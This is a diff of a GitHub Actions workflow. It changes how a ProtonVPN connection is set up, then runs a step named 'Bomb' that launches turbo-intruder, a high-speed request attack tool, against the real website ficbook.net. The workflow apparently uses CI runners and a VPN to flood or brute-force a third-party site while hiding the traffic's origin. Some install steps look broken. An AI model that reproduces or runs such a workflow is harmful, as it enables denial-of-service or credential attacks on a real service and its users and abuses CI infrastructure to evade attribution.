@@ -20,19 +20,11 @@ jobs:
     steps:
     - name: Copy
       uses: actions/checkout@v3
-    - name: Get Docker
+    - name: install vpn
       run: |
-        docker pull ghcr.io/tprasadtp/protonvpn:latest
-        docker run \
-        --rm \
-        --detach \
-        --name=protonvpn \
-        --device=/dev/net/tun \
-        --cap-add=NET_ADMIN \
-        --env PROTONVPN_USERNAME=${{secrets.OPENVPNN}} \
-        --env PROTONVPN_PASSWORD=${{secrets.OPENVPNP}} \
-        --env PROTONVPN_TIER=0 \
-        --env PROTONVPN_SERVER=NL \
-        ghcr.io/tprasadtp/protonvpn:latest
+        sudo apt-get install protonvpn-stable-release_1.0.3_all.deb
+        sudo apt-get update
+        sudo apt-get install protonvpn-cli
+        protonvpn-cli netshield --off
     - name: Bomb
       run: java -jar turbo-intruder-all.jar beta/script_l.py beta/req.txt https://ficbook.net:433 foo
